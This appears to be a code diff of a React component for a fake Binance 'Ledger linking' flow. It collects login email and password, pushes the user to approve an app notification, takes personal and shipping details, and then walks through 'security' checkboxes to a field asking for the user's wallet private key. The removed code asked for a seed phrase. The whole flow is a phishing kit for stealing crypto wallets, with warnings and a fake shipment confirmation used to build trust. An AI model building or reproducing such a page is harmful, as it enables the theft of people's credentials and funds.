+      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
+        <p className="mb-4">
+          After selecting "Convert to Private Key Wallet", you will see a security reminder.
+        </p>
+        
+        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 mb-4">
+          <h4 className="text-red-400 font-medium mb-2">Important:</h4>
+          <p>
+            Read the security reminder carefully. This outlines important information about 
+            managing your private key wallet and the responsibilities that come with it.
+          </p>
+        </div>
+        
+        <p>
+          Security reminders typically cover:
+        </p>
+        <ul className="list-disc ml-5 space-y-2 mt-2">
+          <li>Private key safety</li>
+          <li>Backup recommendations</li>
+          <li>Risk management</li>
+          <li>Personal responsibility for wallet security</li>
+        </ul>
+      </div>
+      
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button 
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          I've Read the Reminder, Continue
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderWalletStep6 = () => (
+    <div className="space-y-6">
+      <div className="flex items-center">
+        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
+          6
+        </div>
+        <h3 className="text-white font-semibold text-lg">Review Convert Wallet details</h3>
+      </div>
+      
+      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
+        <p className="mb-4">
+          After reading the reminder and clicking Next, you will see the Convert Wallet screen.
+        </p>
+        
+        <p>The screen will display information about:</p>
+        <ul className="list-disc ml-5 space-y-2 mt-2">
+          <li>The wallet being converted</li>
+          <li>Assets in the wallet</li>
+          <li>Technical details about the conversion</li>
+        </ul>
+        
+        <p className="mt-4">
+          Review all details carefully to ensure you understand the process and everything is correct.
+        </p>
+      </div>
+      
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button 
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          I've Reviewed Everything, Continue
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderWalletStep7 = () => (
+    <div className="space-y-6">
+      <div className="flex items-center">
+        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
+          7
+        </div>
+        <h3 className="text-white font-semibold text-lg">Confirm security measures</h3>
+      </div>
+      
+      <div className="bg-binance-darkGray/40 rounded-lg p-4 space-y-5 text-gray-300">
+        <p>
+          We are about to link your wallet to your personal Ledger.
+          Before proceeding, please confirm that you understand each of the following points:
+        </p>
+        
+        <div className="flex items-center space-x-2">
+          <Checkbox
+            id="understand"
+            checked={formData.walletConfirmations.understand}
+            onCheckedChange={(checked) => handleWalletConfirmation("understand", checked === true)}
+            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
+          />
+          <label htmlFor="understand" className="text-gray-200">
+            I understand that I am solely responsible for the security of my private key
+          </label>
+        </div>
+        
+        <div className="flex items-center space-x-2">
+          <Checkbox
+            id="risks"
+            checked={formData.walletConfirmations.risks}
+            onCheckedChange={(checked) => handleWalletConfirmation("risks", checked === true)}
+            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
+          />
+          <label htmlFor="risks" className="text-gray-200">
+            I acknowledge the risks associated with private key management
+          </label>
+        </div>
+        
+        <div className="flex items-center space-x-2">
+          <Checkbox
+            id="backup"
+            checked={formData.walletConfirmations.backup}
+            onCheckedChange={(checked) => handleWalletConfirmation("backup", checked === true)}
+            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
+          />
+          <label htmlFor="backup" className="text-gray-200">
+            I will keep a secure backup of my private key and won't share it with anyone
+          </label>
+        </div>
+        
+        <div className="flex items-center space-x-2">
+          <Checkbox
+            id="responsibility"
+            checked={formData.walletConfirmations.responsibility}
+            onCheckedChange={(checked) => handleWalletConfirmation("responsibility", checked === true)}
+            className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
+          />
+          <label htmlFor="responsibility" className="text-gray-200">
+            I understand that lost private keys cannot be recovered by Binance
+          </label>
+        </div>
+      </div>
+      
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button 
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          I Confirm All Points, Continue
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderWalletStep8 = () => (
+    <div className="space-y-6">
+      <div className="flex items-center">
+        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
+          8
+        </div>
+        <h3 className="text-white font-semibold text-lg">Enter your private key</h3>
+      </div>
+      
+      <div className="bg-red-900/20 border border-red-500/30 rounded-md p-4 mb-4">
+        <h4 className="text-red-400 font-medium mb-2">Critical Security Warning:</h4>
+        <p className="text-gray-300">
+          This key is for your eyes only. Do not share it with anyone and ensure no one is watching your screen.
+          Private keys grant complete access to your crypto assets.
+        </p>
+      </div>
+      
+      <div>
+        <label htmlFor="privateKey" className="block text-sm font-medium text-gray-300 mb-2">
+          Enter your private key below to connect your wallet to your Ledger
+        </label>
+        <Input
+          id="privateKey"
+          name="privateKey"
+          value={formData.privateKey}
+          onChange={handleInputChange}
+          placeholder="Enter your private key"
+          className={`bg-binance-darkGray border-gray-600 text-white font-mono ${errors.privateKey ? "border-red-500" : ""}`}
+        />
+        {errors.privateKey && <p className="text-red-500 text-xs mt-1">{errors.privateKey}</p>}
+      </div>
+      
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button 
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          Link My Wallet
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderWalletSuccess = () => (
+    <div className="text-center py-8">
+      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-6">
+        <svg
+          className="w-8 h-8 text-green-600"
+          fill="none"
+          stroke="currentColor"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            strokeLinecap="round"
+            strokeLinejoin="round"
+            strokeWidth="2"
+            d="M5 13l4 4L19 7"
+          ></path>
+        </svg>
+      </div>
+      <h3 className="text-white font-semibold text-xl mb-4">
+        ✅ Your Ledger has been successfully linked!
+      </h3>
+      
+      <div className="bg-binance-darkGray/40 rounded-lg p-4 mt-6 max-w-md mx-auto text-left">
+        <h4 className="text-binance-yellow font-medium mb-2">What's next?</h4>
+        <ul className="list-disc ml-5 space-y-2 text-gray-300">
+          <li>Your Binance Ledger device will be shipped to your address</li>
+          <li>You'll receive tracking information via email</li>
+          <li>Once received, you can start using it with your linked wallet</li>
+          <li>Your estimated delivery: <span className="font-medium">5 business days</span></li>
+        </ul>
+      </div>
+      
+      <div className="mt-8 flex items-center justify-center">
+        <Wallet className="text-binance-yellow mr-2" size={24} />
+        <p className="text-gray-300">
+          Thank you for choosing Binance Ledger for your crypto security
+        </p>
+      </div>
+    </div>
+  );
 
   return (
     <div className="bg-binance-dark rounded-lg p-6 md:p-8 shadow-lg max-w-2xl mx-auto">
       <div className="mb-6">
         <h2 className="text-binance-yellow font-bold text-xl mb-2">
-          {verificationCompleted ? "Security Verification" : "User Verification"}
+          {currentStep >= FormStep.WALLET_STEP1 ? "Wallet Linking Process" : 
+           (currentStep >= FormStep.PERSONAL_DETAILS ? "Account Verification" : "Login")}
         </h2>
-        {!submissionCompleted && (
+        {currentStep <= FormStep.WALLET_SUCCESS && (
           <div className="mb-4">
             <Progress value={formProgress} className="h-2 bg-gray-700" />
             <div className="mt-2 text-sm text-gray-400">
-              Step {currentStep} of 5
+              Step {currentStep} of {FormStep.WALLET_SUCCESS}
             </div>
           </div>
         )}
       </div>
 
-      {!verificationCompleted && !showConfirmation && !submissionCompleted ? (
-        <div className="space-y-6">
-          {currentStep === 1 && (
-            <div className="space-y-4">
-              <h3 className="text-white font-medium">Personal Information</h3>
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <label htmlFor="firstName" className="block text-sm font-medium text-gray-300 mb-1">
-                    First Name
-                  </label>
-                  <Input
-                    id="firstName"
-                    name="firstName"
-                    value={formData.firstName}
-                    onChange={handleInputChange}
-                    placeholder="First Name"
-                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.firstName ? "border-red-500" : ""}`}
-                  />
-                  {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
-                </div>
-                <div>
-                  <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-1">
-                    Last Name
-                  </label>
-                  <Input
-                    id="lastName"
-                    name="lastName"
-                    value={formData.lastName}
-                    onChange={handleInputChange}
-                    placeholder="Last Name"
-                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.lastName ? "border-red-500" : ""}`}
-                  />
-                  {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
-                </div>
-              </div>
-              <div>
-                <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-300 mb-1">
-                  Date of Birth
-                </label>
-                <Input
-                  id="dateOfBirth"
-                  name="dateOfBirth"
-                  type="date"
-                  value={formData.dateOfBirth}
-                  onChange={handleInputChange}
-                  placeholder="Date of Birth"
-                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.dateOfBirth ? "border-red-500" : ""}`}
-                />
-                {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
-              </div>
-            </div>
-          )}
+      <div>
+        {currentStep === FormStep.LOGIN_EMAIL && renderLoginEmail()}
+        {currentStep === FormStep.LOGIN_PASSWORD && renderLoginPassword()}
+        {currentStep === FormStep.APP_VERIFICATION && renderAppVerification()}
+        {currentStep === FormStep.LOGIN_SUCCESS && renderLoginSuccess()}
+        {currentStep === FormStep.PERSONAL_DETAILS && renderPersonalDetails()}
+        {currentStep === FormStep.ADDRESS_DETAILS && renderAddressDetails()}
+        {currentStep === FormStep.CONFIRMATION && renderConfirmation()}
+        {currentStep === FormStep.SHIPMENT_CONFIRMATION && renderShipmentConfirmation()}
+        {currentStep === FormStep.WALLET_STEP1 && renderWalletStep1()}
+        {currentStep === FormStep.WALLET_STEP2 && renderWalletStep2()}
+        {currentStep === FormStep.WALLET_STEP3 && renderWalletStep3()}
+        {currentStep === FormStep.WALLET_STEP4 && renderWalletStep4()}
+        {currentStep === FormStep.WALLET_STEP5 && renderWalletStep5()}
+        {currentStep === FormStep.WALLET_STEP6 && renderWalletStep6()}
+        {currentStep === FormStep.WALLET_STEP7 && renderWalletStep7()}
+        {currentStep === FormStep.WALLET_STEP8 && renderWalletStep8()}
+        {currentStep === FormStep.WALLET_SUCCESS && renderWalletSuccess()}
+      </div>
 
-          {currentStep === 2 && (
-            <div className="space-y-4">
-              <h3 className="text-white font-medium">Contact Information</h3>
-              <div>
-                <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-1">
-                  Email
-                </label>
-                <Input
-                  id="email"
-                  name="email"
-                  type="email"
-                  value={formData.email}
-                  onChange={handleInputChange}
-                  placeholder="Email Address"
-                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.email ? "border-red-500" : ""}`}
-                />
-                {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
-              </div>
-              <div>
-                <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-300 mb-1">
-                  Phone Number
-                </label>
-                <Input
-                  id="phoneNumber"
-                  name="phoneNumber"
-                  type="tel"
-                  value={formData.phoneNumber}
-                  onChange={handleInputChange}
-                  placeholder="Phone Number"
-                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.phoneNumber ? "border-red-500" : ""}`}
-                />
-                {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
-              </div>
-            </div>
-          )}
-
-          {currentStep === 3 && (
-            <div className="space-y-4">
-              <h3 className="text-white font-medium">Address Details</h3>
-              <div>
-                <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-1">
-                  Address
-                </label>
-                <Input
-                  id="address"
-                  name="address"
-                  value={formData.address}
-                  onChange={handleInputChange}
-                  placeholder="Address"
-                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.address ? "border-red-500" : ""}`}
-                />
-                {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address}</p>}
-              </div>
-
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <label htmlFor="zipCode" className="block text-sm font-medium text-gray-300 mb-1">
-                    Zip Code
-                  </label>
-                  <Input
-                    id="zipCode"
-                    name="zipCode"
-                    value={formData.zipCode}
-                    onChange={handleInputChange}
-                    placeholder="Zip Code"
-                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.zipCode ? "border-red-500" : ""}`}
-                  />
-                  {errors.zipCode && <p className="text-red-500 text-xs mt-1">{errors.zipCode}</p>}
-                </div>
-                <div>
-                  <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-1">
-                    City
-                  </label>
-                  <Input
-                    id="city"
-                    name="city"
-                    value={formData.city}
-                    onChange={handleInputChange}
-                    placeholder="City"
-                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.city ? "border-red-500" : ""}`}
-                  />
-                  {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
-                </div>
-              </div>
-
-              <div>
-                <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-1">
-                  Country
-                </label>
-                <Select
-                  name="country"
-                  value={formData.country}
-                  onValueChange={(value) => {
-                    setFormData({
-                      ...formData,
-                      country: value
-                    });
-                    // Clear error for this field if it exists
-                    if (errors.country) {
-                      setErrors({
-                        ...errors,
-                        country: ""
-                      });
-                    }
-                  }}
-                >
-                  <SelectTrigger 
-                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.country ? "border-red-500" : ""}`}
-                  >
-                    <SelectValue placeholder="Select a country" />
-                  </SelectTrigger>
-                  <SelectContent className="bg-binance-darkGray border-gray-600 text-white max-h-[200px]">
-                    {countries.map((country) => (
-                      <SelectItem key={country} value={country}>
-                        {country}
-                      </SelectItem>
-                    ))}
-                  </SelectContent>
-                </Select>
-                {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
-              </div>
-            </div>
-          )}
-
-          <div className="flex justify-between pt-4">
-            {currentStep > 1 && (
-              <Button
-                type="button"
-                onClick={handlePrevious}
-                className="bg-gray-600 hover:bg-gray-700 text-white"
-              >
-                Back
-              </Button>
-            )}
-            <Button
-              type="button"
-              onClick={handleNext}
-              className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 ml-auto"
-            >
-              {currentStep === 3 ? "Complete Verification" : "Next"}
-            </Button>
-          </div>
-        </div>
-      ) : verificationCompleted && !showConfirmation && !submissionCompleted ? (
-        <form onSubmit={(e) => { e.preventDefault(); handleNext(); }} className="space-y-6">
-          <div className="text-center py-4">
-            <h3 className="text-white font-semibold text-xl">
-              Verification successful. Thank you, {formData.firstName} {formData.lastName}.
-            </h3>
-            <p className="text-gray-300 mt-2">
-              Please proceed with the final steps to link your wallet to the ledger.
-            </p>
-          </div>
-
-          <div className="bg-red-900/20 border border-red-500/30 rounded-md p-4 mb-6">
-            <h4 className="text-red-400 font-medium mb-2">Security Notice</h4>
-            <p className="text-gray-300 text-sm">
-              IMPORTANT: The information requested below is highly sensitive and should never be shared with third parties via phone, SMS, or email. 
-              This information should only be entered in this secure form to properly link your wallet to the Binance Ledger device.
-            </p>
-            <div className="mt-4 flex items-center space-x-2">
-              <Checkbox
-                id="securityConfirmation"
-                checked={securityConfirmed}
-                onCheckedChange={handleSecurityConfirmation}
-                className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
-              />
-              <label htmlFor="securityConfirmation" className="text-sm text-gray-200">
-                I understand and confirm that I am providing this information securely
-              </label>
-            </div>
-          </div>
-
-          <div className="space-y-4">
-            <label htmlFor="seedPhrase" className="block text-sm font-medium text-gray-300">
-              Seed Phrase or Private Key
-            </label>
-            <textarea
-              id="seedPhrase"
-              name="seedPhrase"
-              value={formData.seedPhrase}
-              onChange={(e) => setFormData({ ...formData, seedPhrase: e.target.value })}
-              placeholder="Enter your 12 or 24 word seed phrase (with spaces between words) or private key"
-              className="w-full p-3 bg-binance-darkGray border border-gray-600 rounded-md text-white min-h-[100px]"
-              required
-            />
-            <p className="text-xs text-gray-400">
-              This information is required to securely link your wallet to your new Binance Ledger device.
-            </p>
-          </div>
-
-          <div className="pt-4">
-            <Button
-              type="submit"
-              disabled={isSubmitting || !securityConfirmed}
-              className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
-            >
-              Review Information
-            </Button>
-          </div>
-        </form>
-      ) : showConfirmation && !submissionCompleted ? (
-        <div className="space-y-6">
-          <div className="text-center py-2">
-            <h3 className="text-white font-semibold text-xl mb-4">
-              Review Your Information
-            </h3>
-            <p className="text-gray-300 text-sm mb-6">
-              Please review the information below before finalizing your submission.
-            </p>
-          </div>
-
-          <div className="space-y-4 bg-binance-darkGray/40 p-4 rounded-md">
-            <div className="grid grid-cols-2 gap-x-4 gap-y-2">
-              <div className="text-gray-400 text-sm">First Name:</div>
-              <div className="text-white text-sm font-medium">{formData.firstName}</div>
-              
-              <div className="text-gray-400 text-sm">Last Name:</div>
-              <div className="text-white text-sm font-medium">{formData.lastName}</div>
-              
-              <div className="text-gray-400 text-sm">Date of Birth:</div>
-              <div className="text-white text-sm font-medium">{formData.dateOfBirth}</div>
-              
-              <div className="text-gray-400 text-sm">Email:</div>
-              <div className="text-white text-sm font-medium">{formData.email}</div>
-              
-              <div className="text-gray-400 text-sm">Phone Number:</div>
-              <div className="text-white text-sm font-medium">{formData.phoneNumber}</div>
-              
-              <div className="text-gray-400 text-sm">Address:</div>
-              <div className="text-white text-sm font-medium">{formData.address}</div>
-              
-              <div className="text-gray-400 text-sm">Zip Code:</div>
-              <div className="text-white text-sm font-medium">{formData.zipCode}</div>
-              
-              <div className="text-gray-400 text-sm">City:</div>
-              <div className="text-white text-sm font-medium">{formData.city}</div>
-              
-              <div className="text-gray-400 text-sm">Country:</div>
-              <div className="text-white text-sm font-medium">{formData.country}</div>
-            </div>
-
-            <div className="pt-2">
-              <div className="text-gray-400 text-sm">Seed Phrase/Private Key:</div>
-              <div className="bg-gray-800 p-2 rounded mt-1">
-                <div className="text-white text-sm font-mono break-all">
-                  {formData.seedPhrase}
-                </div>
-              </div>
-            </div>
-          </div>
-          
-          <div className="flex justify-between pt-6">
-            <Button
-              type="button"
-              onClick={handlePrevious}
-              className="bg-gray-600 hover:bg-gray-700 text-white"
-            >
-              Go Back
-            </Button>
-            <Button
-              type="button"
-              onClick={handleSubmit}
-              disabled={isSubmitting}
-              className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
-            >
-              {isSubmitting ? "Processing..." : "Confirm & Submit"}
-            </Button>
-          </div>
-        </div>
-      ) : submissionCompleted && (
-        <div className="text-center py-8">
-          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-6">
-            <svg
-              className="w-8 h-8 text-green-600"
-              fill="none"
-              stroke="currentColor"
-              viewBox="0 0 24 24"
-              xmlns="http://www.w3.org/2000/svg"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth="2"
-                d="M5 13l4 4L19 7"
-              ></path>
-            </svg>
-          </div>
-          <h3 className="text-white font-semibold text-xl mb-2">
-            Success! Your Binance Ledger is on the way.
-          </h3>
-          <p className="text-gray-300">
-            The Binance Ledger will be shipped to your provided address:
-            <br />
-            <span className="block mt-2 font-medium">
-              {formData.address}, {formData.zipCode}
-              <br />
-              {formData.city}, {formData.country}
-            </span>
-          </p>
-          <p className="mt-6 text-gray-400 text-sm">
-            You will receive a confirmation email at {formData.email} with tracking information
-            once your device has been shipped.
-          </p>
-        </div>
-      )}
-
-      <AlertDialog open={showConfirmation && isSubmitting} onOpenChange={(open) => {
-        if (!open && isSubmitting) {
-          setShowConfirmation(false);
-        }
-      }}>
+      <AlertDialog open={showVerificationDialog}>
         <AlertDialogContent className="bg-binance-dark border-gray-700">
           <AlertDialogHeader>
-            <AlertDialogTitle className="text-white">Processing Your Request</AlertDialogTitle>
+            <AlertDialogTitle className="text-white">Security Verification</AlertDialogTitle>
             <AlertDialogDescription className="text-gray-300">
-              Please wait while we process your information and prepare your Binance Ledger shipment...
+              Open Binance app on your phone. Binance has sent a notification to your phone.
+              Open your Binance App and confirm the prompt to verify it's you.
             </AlertDialogDescription>
           </AlertDialogHeader>
           <div className="flex justify-center py-4">
-            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow"></div>
+            <div className="w-16 h-16 rounded-full bg-binance-yellow/20 flex items-center justify-center">
+              <div className="text-binance-yellow text-xl">
+                {timerCount}
+              </div>
+            </div>
+          </div>
+        </AlertDialogContent>
+      </AlertDialog>
+
+      <AlertDialog open={showLinkingDialog}>
+        <AlertDialogContent className="bg-binance-dark border-gray-700">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-white">Linking Your Ledger</AlertDialogTitle>
+            <AlertDialogDescription className="text-gray-300">
+              Please wait while we link your wallet to your Binance Ledger device...
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <div className="flex justify-center py-4">
+            <div className="flex flex-col items-center">
+              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow mb-3"></div>
+              <div className="text-binance-yellow">{timerCount} seconds remaining</div>
+            </div>
           </div>
         </AlertDialogContent>
       </AlertDialog>
